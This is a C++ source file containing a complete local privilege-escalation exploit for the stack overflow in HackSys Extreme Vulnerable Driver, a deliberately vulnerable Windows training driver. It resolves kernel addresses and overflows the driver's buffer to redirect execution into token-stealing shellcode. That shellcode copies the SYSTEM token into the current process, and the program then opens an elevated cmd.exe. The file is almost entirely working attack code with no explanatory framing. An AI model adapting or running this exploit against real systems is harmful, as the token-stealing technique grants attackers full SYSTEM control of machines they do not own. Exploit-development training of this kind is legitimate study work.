#include <iostream>
#include <Windows.h>
#include <Psapi.h>

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_DEVICE_NAME				L"\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_BUFFER_OVERFLOW_SIZE	0x820

using PKTHREAD = PVOID;
using KEGETCURRENTTHREAD = PKTHREAD(NTAPI*)();
using PSINITIALSYSTEMPROCESS = PVOID(NTAPI*)();

KEGETCURRENTTHREAD KeGetCurrentThread{};
PSINITIALSYSTEMPROCESS PsInitialSystemProcess{};

static auto NtkrnlpaBase() -> LPVOID {
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];

	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++) {
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 48);

		if (!strcmp((LPSTR)lpfileName, "ntkrnlpa.exe")) {
			return lpImageBase[i];
		}
	}
	return NULL;
}

class BufferOverflowStack {
private:
	HANDLE hHandle;
	void* data;
	void* kernel_base;

public:
	BufferOverflowStack() : hHandle{ getDeviceHandle() }, data{ nullptr }, kernel_base{ nullptr } {
		std::printf("Opened handle to device with value : %p\n", hHandle);
	}

	~BufferOverflowStack() {
		if (hHandle)	::CloseHandle(hHandle);
		if (data)		std::free(data);

		data = nullptr;
	}

	auto interact() -> void {
		data = std::malloc(HACKSYS_EVD_BUFFER_OVERFLOW_SIZE + 0x4);
		if (data == nullptr)	return;

		auto payload = &ShellCode;

		std::memset(data, 'A', HACKSYS_EVD_BUFFER_OVERFLOW_SIZE);
		std::memcpy((byte*)data + HACKSYS_EVD_BUFFER_OVERFLOW_SIZE, &payload, sizeof(void*));
		

		DWORD lpBytesReturned = 0;
		auto ret = ::DeviceIoControl(hHandle, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, data,
			HACKSYS_EVD_BUFFER_OVERFLOW_SIZE + 0x4, nullptr, 0, &lpBytesReturned, nullptr);

		if (ret == false)	std::printf("DeviceIoControl failed with error code : %x\n", ::GetLastError());
		return;
	}

	static auto ShellCode() -> void {

		__asm pushad;
		
		auto systemEProcess = *(void**)PsInitialSystemProcess;

		auto systemProcessToken = *(void**)((byte*)systemEProcess + 0xf8);

		auto currThread = KeGetCurrentThread();

		// KTHREAD->ApcState->Process = KPROCESS
		auto currProcess = *(void**)((byte*)currThread + 0x50);

		// process->token 
		auto currProcessToken = *(void**)((byte*)currProcess + 0xf8);

		auto currProcessTokenOffset = ((byte*)currProcess + 0xf8);
		auto systemProcessTokenOffset = ((byte*)systemEProcess + 0xf8);
		*(void**)currProcessTokenOffset = *(void**)systemProcessTokenOffset;

		__asm popad;
		__asm xor eax, eax;
		__asm add esp, 0Ch;
		__asm pop ebp;
		__asm ret 8;
	}

	auto resolveNtAddress(PCSTR routineName) -> void* {
		if (!kernel_base)	return nullptr;

		HMODULE hUserSpaceBase = LoadLibraryA("ntkrnlpa.exe");
		if (hUserSpaceBase == nullptr)	return nullptr;

		void* pUserSpaceAddress = GetProcAddress(hUserSpaceBase, routineName);
		void* address = (void*)((std::uint32_t)kernel_base +
			((std::uint32_t)pUserSpaceAddress - (std::uint32_t)hUserSpaceBase));

		return address;
	}

	auto resolveKernelAddress() -> void {
		kernel_base = NtkrnlpaBase();

		PsInitialSystemProcess = reinterpret_cast<PSINITIALSYSTEMPROCESS>
			(resolveNtAddress("PsInitialSystemProcess"));

		KeGetCurrentThread = reinterpret_cast<KEGETCURRENTTHREAD>
			(resolveNtAddress("KeGetCurrentThread"));
	}

	auto getDeviceHandle() -> HANDLE {
		auto handle = ::CreateFile(HACKSYS_EVD_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (handle == nullptr || handle == INVALID_HANDLE_VALUE) exit(-1);

		return handle;
	}

	auto createCmdShell() -> void {
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_SHOW;
		WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
		BOOL bReturn = CreateProcessW(nullptr, wzFilePath, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr,
			nullptr, (LPSTARTUPINFOW)&si, &pi);

		if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
	}
};


int main(int argc, char* argv[]) {
	BufferOverflowStack bof;
	bof.resolveKernelAddress();
	bof.interact();
	bof.createCmdShell();

	return 0;
}
